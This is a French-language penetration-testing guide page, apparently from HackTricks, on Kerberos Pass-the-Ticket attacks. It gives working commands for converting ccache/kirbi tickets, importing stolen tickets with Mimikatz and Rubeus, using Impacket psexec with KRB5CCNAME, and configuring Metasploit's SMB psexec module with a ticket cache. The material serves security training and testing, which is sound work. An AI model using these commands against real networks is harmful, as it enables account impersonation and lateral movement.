# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Présentation

Lors d’une attaque Pass-the-Ticket (PtT), un adversaire utilise un ticket Kerberos volé pour s’authentifier en tant que principal du ticket sans posséder le mot de passe de ce compte. Un ticket-granting ticket (TGT) peut être utilisé pour demander des tickets de service, tandis qu’un ticket de service volé est limité au service ciblé et à sa période de validité.<sup>[[1]](#references)</sup>

Pour découvrir les techniques d’acquisition de tickets, consultez :

- [Récolter des tickets depuis Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Récolter des tickets depuis Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Conversion des formats de tickets Linux et Windows

Les caches Kerberos se présentent couramment sous forme de fichiers MIT `ccache` sous Linux et de fichiers `.kirbi` sous Windows. `ticket_converter` convertit ces formats à partir d’un ticket d’entrée et d’un chemin de sortie.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo fournit également des outils de gestion des tickets Kerberos sous Windows.<sup>[[3]](#references)</sup>

## Utiliser un ticket

Sous Linux, définissez `KRB5CCNAME` sur le cache et indiquez à un client Impacket d’utiliser Kerberos sans demander de mot de passe :<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Sous Windows, Mimikatz ou Rubeus peuvent importer un ticket `.kirbi` dans la session de connexion actuelle. Utilisez `klist` pour inspecter le cache obtenu.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

L’importation d’un ticket ne confère pas de privilèges au-delà de ceux qu’il représente et de la politique d’autorisation du service cible. Les tickets expirés, révoqués, mal formés ou dont la portée est incorrecte peuvent échouer.<sup>[[1]](#references)</sup>

Pour un contexte plus large sur les attaques Kerberos et les techniques associées d’acquisition de tickets, consultez le guide de Tarlogic sur les attaques Kerberos.<sup>[[7]](#references)</sup>

### Réutiliser un ticket externe dans Metasploit

Metasploit ne lit pas automatiquement le `KRB5CCNAME` d’Impacket pour ses modules Kerberos. Fournissez au module un **fichier ccache** via son option `::Krb5Ccname` spécifique au protocole. Définissez `::Rhostname` sur le nom d’hôte SPN de la cible et le domaine sur celui de la cible ; `RHOST` peut toujours être l’adresse IP de la cible. Vous pouvez ainsi utiliser un ticket déjà obtenu sans saisir le mot de passe du compte.<sup>[[8]](#references)</sup>

Convertissez d’abord le fichier `.kirbi` en ccache si nécessaire.<sup>[[9]](#references)</sup>

Par exemple, avec un ticket pour un compte autorisé à créer des services sur la cible, exécutez le [module SMB PsExec](../lateral-movement/psexec-and-winexec.md) à l’aide de ce cache :<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit sélectionne d’abord un ticket de service correspondant dans le cache fourni. S’il ne trouve qu’un TGT, il demande un ticket de service au KDC ; cette méthode nécessite donc également une connexion au DC. Un cache contenant uniquement un ticket de service ne donne pas accès à des hôtes sans rapport. Pour les autres modules pris en charge, modifiez le préfixe de l’option (par exemple, `Winrm::Krb5Ccname` pour [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Exemples d’Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Techniques d’attaque Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Authentification de service](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Conversion des fichiers kirbi et ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Implémentation Kerberos du client SMB de Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
